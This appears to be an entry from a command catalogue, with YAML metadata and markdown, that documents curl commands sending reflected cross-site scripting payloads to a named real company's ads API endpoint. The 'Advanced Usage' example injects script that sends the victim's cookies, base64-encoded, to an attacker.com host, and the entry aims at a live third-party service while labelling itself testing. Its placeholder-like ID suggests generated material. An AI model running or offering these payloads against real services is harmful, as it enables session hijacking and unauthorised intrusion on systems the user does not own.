---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://ads.tiktok.com/api/endpoint' -d
  'email=<script>alert("XSS Test")</script>&other_params=value' -H
  'Content-Type: application/x-www-form-urlencoded' --cookie 'session=abc123'
tags:
  - xss
  - testing
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-13T23:52:55.212Z'
verified: false
validated: true
submitted: true
---
# curl-xss-test-tiktok-ads

## Command

```bash
curl -X POST 'https://ads.tiktok.com/api/endpoint' -d 'email=<script>alert("XSS Test")</script>&other_params=value' -H 'Content-Type: application/x-www-form-urlencoded' --cookie 'session=abc123'
```

## Description

This command tests for reflected XSS in TikTok's ads endpoint by injecting a script payload into the email parameter via a POST request, simulating form submission to check for unsanitized reflection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `'https://ads.tiktok.com/api/endpoint'` | Target ads endpoint URL | Yes |
| `-d 'email=<script>...' ` | Data payload with injected script in email | Yes |
| `-H 'Content-Type: ...'` | Sets form-encoded content type | Yes |
| `--cookie 'session=...'` | Optional session cookie for authenticated testing | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://ads.tiktok.com/api/endpoint' -d 'email=<script>alert(1)</script>' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Advanced Usage

```bash
curl -X POST 'https://ads.tiktok.com/api/endpoint' -d 'email=<script>document.location='http://attacker.com?'+btoa(document.cookie)</script>&campaign_id=123' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

## Expected Output

HTTP response with HTML body containing the reflected payload, e.g., "Email: <script>alert('XSS')</script>". If viewed in a browser, an alert dialog appears; otherwise, inspect the response for unescaped script tags.

## Related

- [[Related Procedure: Inject-Malicious-Script-into-Email-Parameter]]
